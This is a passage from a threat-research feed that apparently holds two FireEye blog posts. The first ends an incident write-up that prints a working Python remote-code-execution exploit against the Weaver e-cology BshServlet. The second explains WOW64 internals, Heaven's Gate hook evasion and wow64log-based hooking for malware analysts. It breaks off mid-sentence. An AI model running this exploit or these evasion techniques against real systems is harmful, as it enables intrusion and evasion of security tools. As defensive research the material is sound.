    Gecko) Version/12.0 Safari/1200.1.25', <br />     'Accept':
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', <br />
       'Accept-Language': 'zh-CN,zh;q=0.9', <br />     'Content-Type':
    'application/x-www-form-urlencoded' <br />  }   </span></p>
 <p>
  <span class="code">  </span></p>
 <p>
  <span class="code">def exploit(url,cmd): <br />   
     target=url+'/weaver/bsh.servlet.BshServlet' <br />   
     payload='bsh.script=eval%00(&quot;ex&quot;%2b&quot;ec(\\&quot;cmd+/c+{}\\&quot;)&quot;);&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw'.format(cmd) <br />
     
     res=requests.post(url=target,data=payload,headers=headers,timeout=10) <br />
       res.encoding=res.apparent_encoding <br />     print(res.text)   </span></p>
 <p>
  <span class="code">if __name__ == '__main__': <br />   
     url=sys.argv[1] <br />     while(1): <br />       
     cmd=input('cmd:') <br />         exploit(url,cmd)   </span></p>
 <p>The script contained some hardcoded HTTP header values including
  user-agent, accepted data types, accepted languages and content-type.
  The script builds an HTTP request and allows the user to specify the
  command they would like to run; it would then append the URL and
  command to the crafted exploit to execute. In our instance the
  attacker was leveraging this vulnerability to launch <span
  class="code">mshta.exe</span> to download a second stage payload.</p>
 <p>Using search engines for internet connected devices such as Shodan
  or Censys we can quickly identify systems running the Weaver
  e-cology platform. Using this technique, we identified 28 internet
  facing system that are potentially vulnerable.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/certutil/Picture2.png" alt="" /></p>
 <h4>Conclusion</h4>
 <p>This isn't a new story; Managed Defense responds to cases like this
  every week. The usage of FOMB was particularly interesting in this
  instance and it's the first case in Managed Defense we've seen this
  technique being leveraged in an attempt to bypass defenses. When
  leveraged correctly, compiled “.bmf” files can be effectively used to
  sneak into an environment undetected and gain a foothold via
  persistence in the WMI buffer.</p>
 <p>There are many procedural and technical controls that could help
  prevent a system being compromised. Most larger enterprises are
  complex and identifying all publicly exposed software and services can
  be challenging. We’ve worked on many cases where system administrators
  didn’t believe their system was directly accessible from the internet
  only to later confirm it was. Prioritizing particular patches can be
  difficult and if you don’t think a RCE vulnerability is exposed then
  the Risk level might be incorrectly classified as low.</p>
 <p>A combination of controls is typically the best approach. In Managed
  Defense we assume these controls are imperfect and attackers will find
  a way to bypass them. Deploying strong monitoring capabilities
  combined with a team of analysts hunting through lower fidelity
  signatures or “weak signals” can uncover otherwise unnoticed adversaries.</p>
 <p>Learn more about <a
    href="https://www.fireeye.com/solutions/managed-defense.html">Mandiant
    Managed Defense here</a>. Catch an on-demand recap on this and the
    <a href="https://www.brighttalk.com/webcast/10703/445570">Top 5
    Managed Defense attacks</a> this year.</p>
 <h4>Weaver Build Timeline</h4>
 <ul> <li>2019-09-20: <a
      href="https://www.weaver.com.cn/cs/securityDownload.asp">Weaver
      Patch released</a></li> <li>2019-09-20: Exploit observed in
    Managed Defense</li> <li>2019-09-22: Exploit POC blogged</li>
    <li>2019-10-03: First public mention outside China</li> </ul>
 <h4>References</h4>
 <ul> <li>
    <a
      href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil">Microsoft
      certutil page</a></li> <li>
    <a
      href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/mofcomp">Microsoft
      mofcomp page</a></li> <li>
    <a href="https://github.com/pali/bmfdec">bmfdec GitHub page</a></li> <li>
    <a
      href="https://nsfocusglobal.com/weaver-e-cology-oa-system-remote-code-execution-vulnerability-threat-alert/">Weaver
      Threat Alert</a></li> <li>
    <a
      href="https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#strings">Volatility
      GitHub page</a></li> </ul>
http://www.fireeye.com/blog/threat-research/2019/10/certutil-qualms-they-came-to-drop-fombs.html2019-10-29T18:00:00.000Z2020-11-19T18:48:23.212ZWOW64!Hooks: WOW64 Subsystem Internals and Hooking Techniquesnoemail@noemail.orgStephen Eckels<p>Microsoft is known for their backwards compatibility. When they
  rolled out the 64-bit variant of Windows years ago they needed to
  provide compatibility with existing 32-bit applications. In order to
  provide seamless execution regardless of application bitness, the WoW
  (Windows on Windows) system was coined. This layer, which will be
  referred to as ‘WOW64’ from here on out, is responsible for
  translating all Windows API calls from 32-bit userspace to the 64-bit
  operating system kernel. This blog post is broken up into two
  sections. First we start by diving deep into the WOW64 system. To do
  this, we trace a call from 32-bit userspace and follow the steps it
  takes to finally transition to the kernel. The second part of the post
  assesses two hooking techniques and their effectiveness. I will cover
  how this system works, the ways malware abuses it, and detail a
  mechanism by which all WoW syscalls can be hooked from userspace. Note
  that all information here is true as of Windows 10, version 2004 and
  in some cases <i>has</i> changed from how previous Windows versions
  were implemented.</p>
 <h4>Recognition</h4>
 <p>First and foremost, this is a topic which has existing research by
  multiple authors. This work was critical in efficient exploration of
  the internals and research would have taken much longer had these
  authors not publicly posted their awesome work. I would like to
  callout the following references:</p>
 <ul> <li>(<a
    href="https://wbenny.github.io/2018/11/04/wow64-internals.html">wbenny</a>):
    An extremely detailed view of WOW64 internals on ARM</li> <li>(<a
    href="http://blog.rewolf.pl/blog/?p=102">ReWolf</a>): A PoC heaven’s
    gate implementation</li> <li>(<a
    href="https://github.com/JustasMasiulis/wow64pp">JustasMasiulis</a>):
    A very clean C++ heaven’s gate implementation</li> <li>(<a
    href="https://www.malwaretech.com/2014/02/the-0x33-segment-selector-heavens-gate.html">MalwareTech</a>):
    A WOW64 segmentation explanation</li> </ul>
 <h4>WOW64 Internals</h4>
 <p>To understand how the WOW64 system works internally we will explore
  the call sequence starting in 32-bit usermode before transitioning
  into the kernel from within a system DLL. Within these system DLLs the
  operating system will check arguments and eventually transition to a
  stub known as a syscall stub. This syscall stub is responsible for
  servicing the API call in the kernel. On a 64-bit system, the syscall
  stub is straightforward as it directly executes the syscall
  instruction as shown in Figure 1.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/wowhooks/figure2.png" alt="" />
  <br /> <span class="type-XS">Figure 1: Native x64 Syscall Stub</span></p>
 <p>Figure 2 shows a syscall stub for a 32-bit process running on WOW64</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/wowhooks/figure1.png" alt="" />
  <br /> <span class="type-XS">Figure 2: WOW64 Syscall Stub</span></p>
 <p>Notice that instead of a syscall instruction in the WOW64 version,
    <span class="code">Wow64SystemServiceCall</span> is called. In the
  WOW64 system what would normally be an entry into the kernel is
  instead replaced by a call to a usermode routine. Following this <span
  class="code">Wow64SystemServiceCall</span>, we can see in Figure 3
  that it immediately performs an indirect jmp through a pointer named
    <span class="code">Wow64Transition</span>.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/wowhooks/figure3.png" alt="" />
  <br /> <span class="type-XS">Figure 3: Wow64SystemService transitions
    through a pointer ‘Wow64Transition’</span></p>
 <p>Note that the <span class="code">Wow64SystemServiceCall</span>
  function is found within ntdll labeled as ntdll_77550000; a WOW64
  process has two ntdll modules loaded, a 32-bit one and a 64-bit one.
  WinDbg differentiates between these two by placing the address of the
  module after the 32-bit variant. The 64-bit ntdll can be found in
  %WINDIR%\System32 and the 32-bit in %WINDIR%\SysWOW64. In the PDBs,
  the 64bit and 32bit ntdlls are referred to as ntdll.pdb and wntdll.pdb
  respectively, try loading them in a disassembler! Continuing with the
  call trace, if we look at what the <span
  class="code">Wow64Transition</span> pointer holds we can see its
  destination is <span class="code">wow64cpu!KiFastSystemCall</span>. As
  an aside, note that the address of <span
  class="code">wow64cpu!KiFastSystemCall</span> is held in the 32-bit
  TEB (Thread Environment Block) via member WOW32Reserved, this isn’t
  relevant for this trace but is useful to know. In Figure 4 we see the
  body of <span class="code">KiFastSystemCall</span>.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/wowhooks/figure4.png" alt="" />
  <br /> <span class="type-XS">Figure 4: KiFastSystemCall transitions to
    x64 mode via segment selector 0x33</span></p>
 <p>The <span class="code">KiFastSystemCall</span> performs a jmp using
  the 0x33 segment selector to a memory location just after the
  instruction. This 0x33 segment transitions the CPU into 64-bit mode
  via a GDT entry as described by (MalwareTech).</p>
 <p>Let's recap the trace we've performed to this point. We started from
  a call in ntdll, NtResumeThread. This function calls the
  Wow64SystemServiceCall function which then executes the
  Wow64Transition. The KiFastSystemCall performs the transition from
  32-bit to 64-bit execution. The flow is shown in Figure 5.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/wowhooks/figure5.png" alt="" />
  <br /> <span class="type-XS">Figure 5: 32-bit to 64-bit transition</span></p>
 <p>The destination of the CPU transition jump is the 64-bit code show
  in Figure 6.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/wowhooks/figure6.png" alt="" />
  <br /> <span class="type-XS">Figure 6: Destination of KiFastSystemCall</span></p>
 <p>Figure 6 shows the first 64-bit instruction we’ve seen executed in
  this call trace so far. In order to understand it, we need to look at
  how the WOW64 system initializes itself. For a detailed explanation of
  this refer to (wbenny). For now, we can look at the important parts in
    <span class="code">wow64cpu!RunSimulatedCode</span>.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/wowhooks/figure7.png" alt="" />
  <br /> <span class="type-XS">Figure 7: 64bit registers are saved in RunSimulatedCode</span></p>
 <p>Figure 7 depicts the retrieval of the 64-bit TEB which is used to
  access Thread Local Storage at slot index 1. Then the moving of a
  function pointer table into register r15. The TLS data retrieved is an
  undocumented data structure <span
  class="code">WOW64_CPURESERVED</span> that contains register data and
  CPU state information used by the WOW64 layer to set and restore
  registers across the 32-bit and 64-bit boundaries. Within this
  structure is the <span class="code">WOW64_CONTEXT</span> structure, <a
    href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-wow64_context">partially
    documented on the Microsoft website</a>. I have listed both
  structures at the end of this post. We’ll look at how this context
  structure is used later, but for our understanding of the jmp earlier
  all we need to know is that r15 is a function pointer table.</p>
 <p>It’s interesting to note at this point the architecture of the WOW64
  layer. From the perspective of the 64-bit kernel the execution of
  32-bit (Wow64) usermode applications is essentially a big while loop.
  The loop executes x86 instructions in the processor's 32-bit execution
  mode and occasionally exits the loop to service a system call. Because
  the kernel is 64-bit, the processor mode is temporarily switched to
  64-bit, the system call serviced, then the mode switched back and the
  loop continued where it was paused. One could say the WOW64 layer acts
  like an emulator where the instructions are instead executed on the
  physical CPU.</p>
 <p>Going back to the jmp instruction we saw in Figure 6, we now know
  what is occurring. The instruction jmp [r15 + 0xF8] is equivalent to
  the C code jmp TurboThunkDispatch[0xF8 / sizeof(uint64_t)]. Looking at
  the function pointer at this index we can see we’re at the function
    <span class="code">wow64cpu!CpupReturnFromSimulatedCode</span>
  (Figure 8).</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/wowhooks/figure8.png" alt="" />
  <br /> <span class="type-XS">Figure 8: TurboThunk table's last
    function pointer entry is an exit routine</span></p>
 <p>This routine is responsible for saving the state of the 32-bit
  registers into the <span class="code">WOW64_CONTEXT</span> structure
  we mentioned before as well as retrieving the arguments for the
  syscall. There is some trickiness going on here, so let’s examine this
  in detail. First a pointer to the stack is moved into r14 via xchg,
  the value at this location will be the return address from the syscall
  stub where <span class="code">Wow64SystemServiceCall</span> was
  called. The stack pointer r14 is then incremented by 4 to get a
  pointer to where the stack should be reset when it’s time to restore
  all these context values. These two values are then stored in the
  context’s EIP and ESP variables respectively. The r14 stack pointer is
  then incremented one more time to get the location where the __stdcall
  arguments are (remember stdcall passes all arguments on the stack).
  This argument array is important for later, remember it. The arguments
  pointer is moved into r11, so in C this means that r11 is equivalent
  to an array of stack slots where each slot is an argument uint32_t
  r11[argCount]. The rest of the registers and EFlags are then saved.</p>
 <p>Once the 32-bit context is saved, the WOW64 layer then calculates
  the appropriate TurboThunk to invoke by grabbing the upper 16 bits of
  the syscall number and dispatches to that thunk. Note that at the
  beginning of this array is the function <span
  class="code">TurboDispatchJumpAddressEnd</span>, shown in Figure 9,
  which is invoked for functions that do not support TurboThunks.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/wowhooks/figure9.png" alt="" />
  <br /> <span class="type-XS">Figure 9: TurboThunk table's first
    function pointer entry is an entry routine</span></p>
 <p>TurboThunks are described by (wbenny)—read his blog post at this
  point if you have not. To summarize the post, for functions that have
  simple arguments with widths &lt;= sizeof(uint32_t) the WOW64 layer
  will directly widen these arguments to 64 bits via zero or
  sign-extension and then perform a direct syscall into the kernel. This
  all occurs within wow64cpu, rather than executing a more complex path
  detailed as follows. This acts as an optimization. For more complex
  functions that do not support TurboThunks the <span
  class="code">TurboDispatchJumpAddressEnd</span> stub is used which
  dispatches to <span class="code">wow64!SystemServiceEx</span> to
  perform the system call as shown in Figure 10.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/wowhooks/figure10.png" alt="" />
  <br /> <span class="type-XS">Figure 10: Complex system calls go
    through Wow64SystemServiceEx</span></p>
 <p>We’ll look at this routine in a moment as it’s the meat of this blog
  post, but for now let’s finish this call trace. Once <span
  class="code">Wow64SystemServiceEx</span> returns from doing the system
  call the return value in eax is moved into the <span
  class="code">WOW64_CONTEXT</span> structure and then the 32-bit
  register states are restored. There’s two paths for this, a common
  case and a case that appears to exist only to be used by <span
  class="code">NtContinue</span> and other WOW64 internals. A flag at
  the start of the <span class="code">WOW64_CPURESERVED</span> structure
  retrieved from the TLS slot is checked, and controls which restore
  path to follow as shown in Figure 11.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/wowhooks/figure11.png" alt="" />
  <br /> <span class="type-XS">Figure 11: CPU state is restored once the
    system call is done; there’s a simple path and a complex one
    handling XMM registers</span></p>
 <p>The simpler case will build a jmp that uses the segment selector
  0x23 to transition back to 32-bit mode after restoring all the saved
  registers in the <span class="code">WOW64_CONTEXT</span>. The more
  complex case will additionally restore some segments, xmm values, and
  the saved registers in the <span class="code">WOW64_CONTEXT</span>
  structure and then will do an iret to transition back. The common case
  jmp once built is shown in Figure 12.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/wowhooks/figure12.png" alt="" />
  <br /> <span class="type-XS">Figure 12: Dynamically built jmp to
    transition back to 32bit mode</span></p>
 <p>At this point our call trace is complete. The WOW64 layer has
  transitioned back to 32-bit mode and will continue execution at the
  ret after <span class="code">Wow64SystemServiceCall</span> in the
  syscall stub we started with. Now that an understanding of the flow of
  the WOW64 layer itself is understood, let’s examine the <span
  class="code">Wow64SystemServiceEx</span> call we glossed over before.</p>
 <p>A little bit into the <span class="code">Wow64SystemServiceEx</span>
  routine, Figure 13 shows some interesting logic that we will use later.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/wowhooks/figure13.png" alt="" />
  <br /> <span class="type-XS">Figure 13: Logging routines invoked
    before and after dispatching the syscalls</span></p>
 <p>The routine starts by indexing into service tables which hold
  pointers to routines that convert the passed argument array into the
  wider 64-bit types expected by the regular 64-bit system modules. This
  argument array is exactly the stack slot that was stored earlier in r14.</p>
 <p>Two calls to the <span class="code">LogService</span> function
  exist, however these are only called if the DLL
  %WINDIR%\system32\wow64log.dll is loaded and has the exports
  Wow64LogInitialize, Wow64LogSystemService, Wow64LogMessageArgList, and
  Wow64LogTerminate. This DLL is not present on Windows by default, but
  it can be placed there with administrator privileges. </p>
 <p>The next section will detail how this logging DLL can be used to
  hook syscalls that transition through this wow64layer. Because the
  logging routine <span class="code">LogService</span> is invoked before
  and after the syscall is serviced we can achieve a standard looking
  inline hook style callback function capable of inspecting arguments
  and return values.</p>
 <h4>Bypassing Inline Hooks</h4>
 <p>As described in this blog post, Windows provides a way for 32-bit
  applications to execute 64-bit syscalls on a 64-bit system using the
  WOW64 layer. However, the segmentation switch we noted earlier can be
  manually performed, and 64-bit shellcode can be written to setup a
  syscall. This technique is popularly called “Heaven’s Gate”.
  JustasMasiulis’ work <a
  href="https://github.com/JustasMasiulis/wow64pp/blob/be72557d0bd2e997d985fd9c590529b62de3765b/include/wow64pp.hpp#L727">call_function64</a>
  can be used as a reference to see how this may be done in practice
  (JustasMasiulis). When system calls are performed this way the 32-bit
  syscall stub that the WOW64 layer uses is completely skipped in the
  execution chain. This is unfortunate for security products or tracing
  tools because any inline hooks in-place on these stubs are also
  bypassed. Malware authors know this and utilize “Heaven’s Gate” as a
  bypass technique in some cases. Figure 14 and Figure 15 shows the
  execution flow of a regular syscall stub through the WOW64 layer, and
  hooked syscall stub where malware utilizes “Heaven’s Gate”.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/wowhooks/figure14.png" alt="" />
  <br /> <span class="type-XS">Figure 14: NtResumeThread transitioning
    through the WOW64 layer</span></p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/wowhooks/figure15b.png" alt="" />
  <span class="type-XS">
    <br /> Figure 15: NtResumeThread inline hook before transitioning
    through the WOW64 layer</span></p>
 <p>As seen in Figure 15, when using the Heaven’s Gate technique,
  execution begins <i>after</i> the inline hook and WOW64 layer is done.
  This is an effective bypass technique, but one that is easy to detect
  from a lower level such as a driver or hypervisor. The easiest bypass
  to inline hooks is simply to restore the original function bytes,
  usually from bytes on disk. Malware such as AgentTesla and Conti has
  been known to utilize this last evasion technique.</p>
 <h4>Hooking WOW64 via Inline Hooks</h4>
 <p>As a malware analyst being able to detect when samples attempt to
  bypass the WOW64 layer can be very useful. The obvious technique to
  detect this is to place inline hooks on the 64-bit syscall stubs as
  well as the 32-bit syscall stubs. If the 64-bit hook detects an
  invocation that didn’t also pass through the 32-bit hook, then it’s
  known that a sample is utilizing Heaven’s Gate. This technique can
  detect both evasion techniques previously detailed. However, in
  practice this is very difficult to implement. Looking at the
  requirements that must be satisfied to hook the 64-bit syscall stub we
  come up with this list:</p>
 <ol> <li>Install 64-bit hook from a 32-bit module<ul> <li>How do you
        read/write 64-bit address space from a 32-bit module?</li> </ul>
  </li> <li>Implement a 64-bit callback from a 32-bit module<ul>
        <li>Typically, inline hooking uses C functions as callback
        stubs, but we’re compiling a 32-bit module so we’ll have a
        32-bit callback instead of the required 64-bit one.</li> </ul>
  </li> </ol>
 <p>To solve the first challenge ntdll kindly provides the exports <span
  class="code">NtWow64ReadVirtualMemory64</span>, <span
  class="code">NtWow64WriteVirtualMemory64</span>, and <span
  class="code">NtWow64QueryInformationProcess64</span>. Using these it
  is possible to read memory, write memory, and retrieve the PEB of a
  64-bit module from a 32-bit process. However, the second challenge is
  much harder as either shellcode or a JIT will be required to craft a
  callback stub of the right bitness. In practice ASMJIT may be utilized
  for this. This is however a very tedious technique to trace a large
  number of APIs. There are other challenges to this technique as well.
  For example, in modern Windows 10 the base address of ntdll64 is set
  to a high 64-bit address rather than a lower 32-bit address as in
  Windows 7. Due to this, supporting returns from callbacks back up to
  the original hooked stub and allocating a trampoline within the
  required memory range is difficult since the standard ret instruction
  doesn’t have enough bits on the stack to represent the 64-bit return address.</p>
 <p>As an aside, it should be noted that the WOW64 layer contains what
  is likely a bug when dealing with the <span
  class="code">NtWow64*</span> functions. These APIs all take a <span
  class="code">HANDLE</span> as first argument, which <i>should</i> be
  sign extended to 64-bits. However, this does not occur for these APIs,
  therefore when using the pseudo handle -1 the call fails with <span
  class="code">STATUS_INVALID_HANDLE</span>. This bug was introduced in
  an unknown Windows 10 version. To successfully use these APIs <span
  class="code">OpenProcess</span> must be used to retrieve a real,
  positive valued handle.</p>
 <p>I will not be covering the internals of how to inline hook the
  64-bit syscall stub since this post is already very long. Instead I
  will show how my hooking library <a
  href="https://github.com/stevemk14ebr/PolyHook_2_0">PolyHook2</a> can
  be extended to support cross-architecture hooking using these Windows
  APIs, and leave the rest as an exercise to the reader. This works
  because PolyHook’s trampolines are not limited to +-2GB and do not
  spoil registers. The internals of how <i>that</i> is achieved is a
  topic for another post. Figure 16 depicts how to overload the C++ API
  of polyhook to read/write memory using the aforementioned WinAPIs.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/wowhooks/figure16.png" alt="" />
  <br /> <span class="type-XS">Figure 16: Overloading the memory
    operations to read/write/protect 64-bit memory</span></p>
 <p>Once these inline hooks are in-place on the 64-bit syscall stubs,
  any application utilizing Heaven’s Gate will be properly intercepted.
  This hooking technique is very invasive and complicated and can still
  be bypassed if a sample was to directly execute a syscall instruction
  rather than using the 64-bit module’s syscalls stub. Therefore, a
  driver or hypervisor is more suitable to detect this evasion
  technique. Instead we can focus on the more common byte restoration
  evasion techniques and look for a way to hook the WOW64 layer itself.
  This doesn’t involve assembly modifications at all.</p>
 <h4>Hooking WOW64 via LogService</h4>
 <p>Thinking back to the WOW64 layer’s execution flow we know that all
  calls which are sent through the <span
  class="code">Wow64SystemServiceEx</span> routine may invoke the
  routine <span class="code">Wow64LogSystemService</span> if the logging
  DLL is loaded. We can utilize this logging DLL and routine to
  implement hooks which can be written the exact same way as inline
  hooks, without modifying any assembly.</p>
 <p>The first step to implementing this is to force all API call paths
  through the <span class="code">Wow64SystemServiceEx</span> routine so
  that the log routine may be called. Remember earlier that those that
  support TurboThunks will not take this path. Lucky for us we know that
  any TurboThunk entry that points to <span
  class="code">TurboDispatchJumpAddressEnd</span> will take this path.
  Therefore, by pointing every entry in the TurboThunk table to point at
  that address, the desired behavior is achieved. Windows kindly
  implements this patching via <span
  class="code">wow64cpu!BTCpuTurboThunkControl</span> as shown in Figure 17.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/wowhooks/figure17.png" alt="" />
  <br /> <span class="type-XS">Figure 17: Patching the TurboThunk table
    is implemented for us</span></p>
 <p>Note that in previous Windows versions the module which exported
  this and how it did is different to Windows 10, version 2004. After
  invoking this patch routine all syscall paths through WOW64 go through
    <span class="code">Wow64SystemServiceEx</span> and we can focus on
  crafting a logging DLL that man-in-the-middles (MITMs) all calls.
  There are a couple of challenges to be considered here:</p>
 <ol> <li>How do we determine which system call is currently occurring
    from the logging DLL?</li> <li>How are callbacks written? Wow64log
    is 64-bit DLL, we’d like a 32-bit callback.<ul> <li>Is shellcode
        required, or can we make nice C style function callbacks?</li>
    </ul> </li> <li>What APIs may we call? All that’s loaded is 64-bit
  ntdll.</li> </ol>
 <p>The first concern is rather easy, from within the wow64log DLL we
  can read the syscall number from the syscall stubs to create a map of
  number to name. This is possible because syscall stubs always start
  with the same assembly and the syscall number is at a static offset of
  0x4. Figure 18 shows how we can then compare the values in this map
  against the syscall number passed to <span
  class="code">Wow64LogSystemService</span>’s parameter structure <span class="code">WOW64_LOG_SERVICE</span>.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">typedef uint32_t* WOW64_ARGUMENTS;<br />
            struct WOW64_LOG_SERVICE<br />  {<br />        uint64_t
            BtLdrEntry;<br />        WOW64_ARGUMENTS Arguments;<br />   
                ULONG ServiceTable;<br />        ULONG
            ServiceNumber;<br />        NTSTATUS Status;<br />       
            BOOLEAN PostCall;<br />  };</span></p> <p>
          <span class="code">EXTERN_C<br />  __declspec(dllexport)<br />
            NTSTATUS<br />  NTAPI<br />
            Wow64LogSystemService(WOW64_LOG_SERVICE* service)<br />
            {<br />       for (uint32_t i = 0; i &lt; LAST_SYSCALL_ID;
            i++) {<br />          const char* sysname =
            SysCallMap[i].name;<br />          uint32_t syscallNum =
            SysCallMap[i].SystemCallNumber;<br />          if
            (ServiceParameters-&gt;ServiceNumber != syscallNum)<br />   
                      continue;<br />          //LOG sysname<br />     
             }<br />  }</span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 18: Minimal example of determining which
    syscall is occurring—in practice the service table must be checked too</span></p>
 <p>Writing callbacks is a bit more challenging. The wow64log DLL is
  executing in 64-bit mode and we’d like to be able to write callbacks
  in 32-bit mode since it’s very easy to load additional 32-bit modules
  into a WOW64 process. The best way to handle this is to write
  shellcode which is capable of transitioning back to 32-bit mode,
  execute the callback, then go back to 64-bit mode to continue
  execution in the wow64log DLL. The segment transitions themselves are
  rather easy at this point, we know we just need to use 0x23 or 0x33
  segment selectors when jumping. But we also need to deal with the
  calling convention differences between 64-bit and 32-bit. Our
  shellcode will therefore be responsible for moving 64-bit arguments’
  register/stack slots to the 32-bit arguments register/stack slots.
  Enforcing that 32-bit callbacks may only be __cdecl makes this easier
  as all arguments are on the stack and the shellcode has full control
  of stack layout and cleanup. Figure 19 shows the locations of the
  arguments for each calling convention. Once the first 4 arguments are
  relocated all further arguments can be moved in a loop since it’s
  simply moving stack values into lower slots. This is relatively easy
  to implement using external masm files in MSVC. Raw bytes will need to
  be emitted at points rather than using the assembler due to the mix of
  architectures. Alternatively, GCC or Clang inline assembly could be
  used. ReWolf’s work achieves the opposite direction of 32-bit -&gt;
  64-bit and implements the shellcode via msvc inline asm. X64 MSVC
  doesn’t support this and there are complications with REX prefixes
  when using that method. It’s nicer to use external masm files and rely
  on the linker to implement this shellcode.</p>
 <table border="0" cellspacing="0" cellpadding="0" width="651"> <tbody>
    <tr>
      <td width="163"><p>
          <b>Arg Number</b></p> </td> <td width="163" valign="top"><p>
          <b>Cdecl Location</b></p> </td> <td width="196" valign="top"><p>
          <b>Fastcall Location</b></p> </td> <td width="129" valign="top"><p>
          <b>Special Case?</b></p> </td> </tr>
    <tr>
      <td width="163" valign="top"><p>0</p> </td> <td width="163"
          valign="top"><p>[ebp + 8]</p> </td> <td width="196"
        valign="top"><p>rcx</p> </td> <td width="129"
        valign="top"><p>Yes</p> </td> </tr>
    <tr>
      <td width="163" valign="top"><p>1</p> </td> <td width="163"
          valign="top"><p>[ebp + 12]</p> </td> <td width="196"
        valign="top"><p>rdx</p> </td> <td width="129"
        valign="top"><p>Yes</p> </td> </tr>
    <tr>
      <td width="163" valign="top"><p>2</p> </td> <td width="163"
          valign="top"><p>[ebp + 16]</p> </td> <td width="196"
        valign="top"><p>r8d</p> </td> <td width="129"
        valign="top"><p>Yes</p> </td> </tr>
    <tr>
      <td width="163" valign="top"><p>3</p> </td> <td width="163"
          valign="top"><p>[ebp + 20]</p> </td> <td width="196"
        valign="top"><p>r9d</p> </td> <td width="129"
        valign="top"><p>Yes</p> </td> </tr>
    <tr>
      <td width="163" valign="top"><p>4</p> </td> <td width="163"
          valign="top"><p>[ebp + 24]</p> </td> <td width="196"
          valign="top"><p>[rbp + 32 + 8]</p> </td> <td width="129"
        valign="top"><p>No</p> </td> </tr>
    <tr>
      <td width="163" valign="top"><p>5</p> </td> <td width="163"
          valign="top"><p>[ebp + 28]</p> </td> <td width="196"
          valign="top"><p>[rbp + 32 + 16]</p> </td> <td width="129"
        valign="top"><p>No</p> </td> </tr>
    <tr>
      <td width="163" valign="top"><p>6</p> </td> <td width="163"
          valign="top"><p>[ebp + 32]</p> </td> <td width="196"
          valign="top"><p>[rbp + 32 + 24]</p> </td> <td width="129"
        valign="top"><p>No</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 19: Cdecl vs Fastcall argument positions</span></p>
 <p>Once this shellcode is written and wrapped into a nice C++ function,
  it’s possible for the wow64log DLL to invoke the callback via a simple
  C style function pointer call shown in Figure 20.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/wowhooks/figure20.png" alt="" />
  <br /> <span class="type-XS">Figure 20: call_function32 invokes
    shellcode to call a 32-bit callback from the 64-bit logging DLL</span></p>
 <p>From within the 32-bit callback any desired MITM operations can be
  performed, but restrictions exist on which APIs are callable. Due to
  the context saving that the WOW64 layer performs, 32-bit APIs that
  would re-enter the WOW64 layer may not be called as the context values
  would be corrupted. We are therefore limited to only APIs that won’t
  re-enter WOW64, which are those that are exported from the 64-bit
  ntdll. The <span class="code">NtWriteFile</span> export may be used to
  easily write to stdout or a file, but we must re-enter the 64-bit
  execution mode and do the inverse argument mapping as before. This
  logging routine can be called from within the 32-bit callbacks and is
  shown in Figure 21 and Figure 22.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/wowhooks/figure21.png" alt="" />
  <br /> <span class="type-XS">Figure 21: call_function64 invokes
    shellcode to call the 64bit WriteFile from with the 32bit callback</span></p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/wowhooks/figure22.png" alt="" />
  <br /> <span class="type-XS">Figure 22: 32bit callbacks must log via
    routines that only call non-reentrant WOW64 APIs</span></p>
 <p>The result is clean looking callback stubs that function exactly how
  inline hooks might, but with zero assembly modifications required.
  Arguments can easily be manipulated as well, but the return status may
  not be modified unless a little stack walk hackery is implemented. The
  only other consideration is that the wow64log DLL itself needs to be
  carefully crafted to not build with any CRT mechanisms. The flags
  required are:</p>
 <ul> <li>Disable CRT with /NODEFAULT LIB (all C APIs now unavailable),
    set a new entry point name to not init CRT NtDllMain</li>
    <li>Disable all CRT security routines /GS-</li> <li>Disable C++
  exceptions</li> <li>Remove default linker libraries, only link
  ntdll.lib</li> <li>Use extern “C” __declspec(dllimport)
    &lt;typedef&gt; to link against the correct NtApis</li> </ul>
 <p>An example of a program hooking its own system calls via wow64log
  inline hooks is shown in Figure 23.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/wowhooks/figure23.gif" alt="" />
  <br /> <span class="type-XS">Figure 23: Demonstration of inline hooks
    in action</span></p>
 <h4>Conclusion</h4>
 <p>Using inline WOW64 hooks, wow64log hooks, and kernel/hypervisor
  hooks, all techniques of usermode hook evasion can be identified
  easily and automatically. Detecting which layers of hooks are skipped
  or bypassed will give insight into which evasion technique is
